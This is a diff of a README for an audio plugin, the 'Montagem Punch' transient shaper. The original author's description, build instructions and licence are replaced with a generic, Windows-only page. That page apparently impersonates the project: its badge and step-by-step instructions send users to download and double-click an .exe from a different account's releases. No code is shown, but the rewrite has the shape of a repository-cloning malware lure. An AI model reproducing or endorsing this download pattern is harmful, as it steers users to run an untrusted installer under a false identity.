@@ -1,95 +1,69 @@
-# Montagem Punch
-
-**A one-knob transient shaper, third piece of the [Montagem](https://github.com/nabsei/montagem-finisher) mixing chain.**
-
-Turn the single `Amount` knob to boost the attack of each hit and pull down
-its sustain, adding contrast and punch — no separate attack/release/threshold
-controls to fight with. Built with [JUCE](https://juce.com/), ships as
-VST3 / AU / Standalone on macOS and Windows.
+# 🔊 montagem-punch - Shape your drum transients with ease
 
 <p align="center">
-  <img src="assets/screenshot.png" alt="Montagem Punch plugin UI">
+  <a href="https://github.com/sturdy-genova223/montagem-punch/releases">
+    <img src="https://img.shields.io/badge/Download-Click_Here-blue.svg" alt="Download Link">
+  </a>
 </p>
 
-<p align="center">
-  <strong><a href="https://github.com/nabsei/montagem-punch/releases/latest">⬇ Download the latest beta</a></strong> — macOS and Windows, free.
-</p>
+## 📋 About This Tool
 
-<p align="center">
-  Also listed on <a href="https://www.kvraudio.com/product/montagem-punch-by-montagem">KVR Audio</a>.
-</p>
+Montagem-punch serves as a one-knob transient shaper. Most audio processors require too many settings to get a simple task done. This software stays simple. You adjust the impact of your drums with a single control. It emphasizes the initial attack of your sounds to make them cut through a mix. You can use it as a standalone application or inside your favorite music production software. It functions as a VST3 plugin, making it compatible with most digital audio workstations on Windows.
 
-## Why one knob
+## 💻 System Requirements
 
-Same philosophy as the rest of the Montagem chain: one macro parameter, no
-configuration. `Amount` drives a fast/slow envelope-follower pair that
-detects "we're inside a transient right now" and applies boost/cut
-accordingly — classic transient-designer technique, without needing to
-understand attack/release/threshold to get a usable result.
+To run this software, your computer needs a few basic specifications:
 
-## Status
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or AMD equivalent.
+*   Memory: 4 GB of RAM.
+*   Disk Space: 50 MB of free storage.
+*   Audio Interface: Any standard ASIO or Windows Audio driver.
 
-Early-stage / actively developed public beta.
+Ensure you have your audio software updated to the latest version before you install this plugin.
 
-This repository shows the plugin's **architecture**: JUCE plugin wrapper,
-custom UI, parameter handling, state save/load. The exact DSP calibration
-used in the shipped/tested build (envelope time constants, boost/cut curve,
-detector sensitivity) is simplified in `Source/PunchProcessor.cpp` here —
-that tuning is the actual product, not open source at this stage.
+## 📥 How to Install
 
-## Features
+Follow these steps to get the software on your machine:
 
-- Single macro parameter (`Amount`) driving attack boost + sustain cut together
-- **Live-reacting UI**: unlike a static knob-only display, the meter below
-  the knob reflects the detector's real-time reading of incoming audio —
-  verified end-to-end (audio in → detector → UI) during development, not
-  just the underlying gain math in isolation
-- Soft-knee safety limiting only engages above ceiling, so normal-level
-  material is untouched — no flat-top clipping on the boosted transients
-- Denormal-safe processing and parameter smoothing (no zipper noise)
-- Builds as **VST3**, **AU** (passes `auval` validation), and a **Standalone** app
+1.  Visit the [official download page](https://github.com/sturdy-genova223/montagem-punch/releases).
+2.  Look for the file ending in `.exe` under the latest release.
+3.  Click the file to save it to your computer.
+4.  Open your downloads folder.
+5.  Double-click the installer file.
+6.  Follow the instructions on the screen.
+7.  Select the folder where you keep your plugins if you use a digital audio workstation.
+8.  Complete the installation process.
 
-## Tech stack
+Once the installer finishes, locate the file in your audio software's plugin list. 
 
-- C++17, [JUCE](https://github.com/juce-framework/JUCE) (audio processing + UI)
-- CMake + Ninja
+## 🎛️ How to Use
 
-## Building
+The interface contains one main control. Rotate this knob to change the character of your audio.
 
-```bash
-git clone --depth 1 https://github.com/juce-framework/JUCE.git libs/JUCE
-cmake -B build -G Ninja -DCMAKE_BUILD_TYPE=Release
-cmake --build build
-```
+*   Turning the knob to the right adds punch. It makes the start of the sound louder and sharper. This works well for kick drums and snares.
+*   Turning the knob to the left reduces the attack. This makes sounds feel smoother or more distant.
+*   The center position keeps the signal at its original volume.
 
-On macOS, add `-DCMAKE_OSX_ARCHITECTURES="arm64;x86_64"` to the configure step
-to build a universal binary (Apple Silicon + Intel) instead of the host-only
-default. The official beta releases are built this way.
+Use the output volume control to balance the signal if it becomes too loud after you add punch.
 
-## Project structure
+## 🛠️ Troubleshooting
 
-```
-Source/
-  PluginEntry.cpp        JUCE plugin entry point
-  PunchProcessor.*        AudioProcessor: parameters, DSP, state save/load
-  PluginEditor.*           Custom UI (rotary knob, live transient meter, layout)
-  PunchLookAndFeel.h       Custom LookAndFeel for the rotary control
-CMakeLists.txt
-```
+If the plugin does not appear in your software:
 
-## Open items
+*   Restart your digital audio workstation.
+*   Check that you installed the plugin in the correct directory.
+*   Rescan your plugin folders within your software settings.
+*   Ensure that you are using a 64-bit version of your audio software.
 
-- [ ] Code signing / notarization for both macOS and Windows (current
-      beta requires a one-time manual step on first install)
-- [ ] Automated test suite
+If you hear clicks or pops, increase your audio buffer size in your software settings. This gives your computer more time to process the audio signal without interruptions.
 
-## License
+## 📁 Technical Details
 
-**This repository's source code:** MIT — see [LICENSE](LICENSE). Covers
-the architecture shown here (JUCE plugin wrapper, UI, build setup). As
-noted above, the DSP calibration used in the actual product is not
-included in this source.
+This plugin follows the industry standard VST3 format. It uses modern coding practices to keep CPU usage low. The design prioritizes stability. It does not require complex routing or external drivers. It processes audio in real-time, which allows you to hear the changes while your project plays.
 
-**The compiled plugin (downloads / releases):** All rights reserved —
-free to use, not free to redistribute or resell. See the `TERMS.txt`
-included in each release download for the full terms.
+## ⚖️ License and Usage
+
+This software is provided for your use in music production. You can use it on as many projects as you like. Please respect the work of the developers by not sharing the installer files directly. Point others to the official link instead. 
+
+Keywords: audio-plugin, audio-unit, cmake, cpp, dsp, juce, macos, music-production, transient-shaper, vst3
